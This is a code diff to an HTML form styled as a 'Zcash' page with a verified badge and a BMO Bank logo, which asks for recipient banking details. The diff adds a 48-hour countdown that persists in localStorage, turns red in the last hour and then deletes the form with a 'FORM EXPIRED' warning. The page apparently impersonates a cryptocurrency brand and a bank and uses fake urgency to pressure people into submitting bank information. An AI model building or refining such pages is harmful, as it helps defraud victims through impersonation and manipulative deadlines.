@@ -39,6 +39,37 @@
   .bmo-banner{display:flex;flex-direction:column;align-items:center;gap:8px;background:#f0f4ff;border:1px solid #c7d2fe;border-radius:12px;padding:14px;margin-bottom:14px}
   .bmo-logo{width:220px;max-width:100%;height:auto;border-radius:6px;display:block}
   .bmo-sub{font-size:12px;color:var(--muted)}
+  .timer-bar{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    background:var(--orange-light);
+    border:1px solid var(--orange-border);
+    color:#7c2d12;
+    border-radius:10px;
+    padding:10px;
+    font-weight:800;
+    font-size:14px;
+    margin-bottom:12px;
+  }
+  .timer-bar.urgent{
+    background:#fef2f2;
+    border-color:#fecaca;
+    color:#991b1b;
+  }
+  .time-up-caution{
+    max-width:760px;
+    margin:16px auto;
+    background:#fff;
+    border:2px solid #f59e0b;
+    border-radius:16px;
+    padding:24px;
+    text-align:center;
+    font-size:20px;
+    font-weight:900;
+    color:#92400e;
+  }
   .checks{display:flex;gap:16px;flex-wrap:wrap;background:var(--orange-light);border:1px solid var(--orange-border);padding:12px;border-radius:10px}
   .check{display:flex;align-items:center;gap:8px;font-weight:700;font-size:14px}
   input[type="radio"],input[type="checkbox"]{width:20px;height:20px;accent-color:var(--orange)}
@@ -69,6 +100,8 @@
 </style>
 </head>
 <body>
+<div id="timeUpCaution" class="time-up-caution" hidden>⚠️ TIME UP — FORM EXPIRED</div>
+
 <form id="bmoForm" novalidate enctype="multipart/form-data">
   <div class="card">
     <header class="header"><div class="logo">Z</div><div class="brand">Zcash <span class="verified">✔</span></div></header>
@@ -78,15 +111,15 @@
     <input type="hidden" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off" />
 
     <div class="bmo-banner">
-      <svg class="bmo-logo" viewBox="0 0 340 120" role="img" aria-label="BMO Bank N.A. logo" xmlns="http://www.w3.org/2000/svg">
-        <rect width="340" height="120" rx="6" fill="#0d7dc2"/>
-        <text x="22" y="82" font-family="Georgia,'Times New Roman',serif" font-size="62" fill="#ffffff" letter-spacing="1">BMO</text>
-        <circle cx="282" cy="60" r="46" fill="#e4002b"/>
-        <path fill="#ffffff" d="M256,48 H266 L282,64 L298,48 H308 V84 H256 Z"/>
-        <path fill="#e4002b" d="M272,72 L282,52 L292,72 Z"/>
-      </svg>
+      <!-- Uploaded BMO photo: save as bmo-logo.png next to this file, or replace src with your image URL -->
+      <img class="bmo-logo" src="bmo-logo.png" alt="BMO Bank N.A. logo" />
       <div class="bmo-sub">Bank of Montreal – United States</div>
     </div>
+
+    <div id="countdownBar" class="timer-bar" role="timer" aria-live="polite">
+      ⏳ Time remaining: <span id="countdownText">48:00:00</span>
+    </div>
+
     <div class="notice">⚠️ <strong>NOTICE:</strong> All banking details below must exactly match the name registered on the BMO account. Mismatched names may delay or reject the transfer.</div>
 
     <div class="step"><span class="num">1</span> Recipient Information 👤</div>
@@ -355,6 +388,65 @@
       validateForm();
     }
   });
+})();
+</script>
+
+<script>
+(() => {
+  const STORAGE_KEY = "bmoForm48hDeadline";
+  const DURATION_MS = 48 * 60 * 60 * 1000;
+
+  const form = document.getElementById("bmoForm");
+  const bar = document.getElementById("countdownBar");
+  const text = document.getElementById("countdownText");
+  const caution = document.getElementById("timeUpCaution");
+
+  let deadline;
+
+  try {
+    deadline = Number(localStorage.getItem(STORAGE_KEY));
+
+    if (!deadline || Number.isNaN(deadline)) {
+      deadline = Date.now() + DURATION_MS;
+      localStorage.setItem(STORAGE_KEY, String(deadline));
+    }
+  } catch (_) {
+    deadline = Date.now() + DURATION_MS;
+  }
+
+  function expire() {
+    if (form) form.remove();
+    if (caution) caution.hidden = false;
+  }
+
+  function tick() {
+    const remaining = deadline - Date.now();
+
+    if (remaining <= 0) {
+      expire();
+      return false;
+    }
+
+    if (text) {
+      const h = Math.floor(remaining / 3600000);
+      const m = Math.floor((remaining % 3600000) / 60000);
+      const s = Math.floor((remaining % 60000) / 1000);
+
+      text.textContent = `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
+    }
+
+    if (bar) {
+      bar.classList.toggle("urgent", remaining <= 60 * 60 * 1000);
+    }
+
+    return true;
+  }
+
+  if (tick()) {
+    const timer = setInterval(() => {
+      if (!tick()) clearInterval(timer);
+    }, 1000);
+  }
 })();
 </script>
 </body>
